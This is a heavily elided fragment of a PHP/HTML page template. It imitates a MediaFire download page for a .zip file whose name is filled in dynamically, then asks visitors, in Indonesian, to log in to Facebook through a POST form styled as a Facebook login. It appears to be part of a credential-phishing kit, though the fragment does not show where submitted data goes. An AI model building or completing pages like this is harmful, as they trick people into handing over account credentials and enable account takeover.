...
<div class="dl-btn-label" title="<?php echo $namafile; ?>.zip">
<?php echo $namafile; ?></div>
</div>
...
<div class="filename"><?php echo $namafile; ?>.zip</div>
<div class="filetype"><span>Compressed Archive</span><span> (.ZIP)<span></span></span></div>
</div>
<ul class="details">
		      ...
		      <div class="content-box-fb">
		         ...
		         <div class="txt-login-fb">
		          Masuk ke akun Facebook Anda untuk terhubung dengan MediaFire
                    ...
                    <form class="login-facebook-form" action="" method="POST" onclick="$(this).end()">
		            <label>
...
(function() {
  ...
  var optFileName = "<?php echo $namafile; ?>.zip";
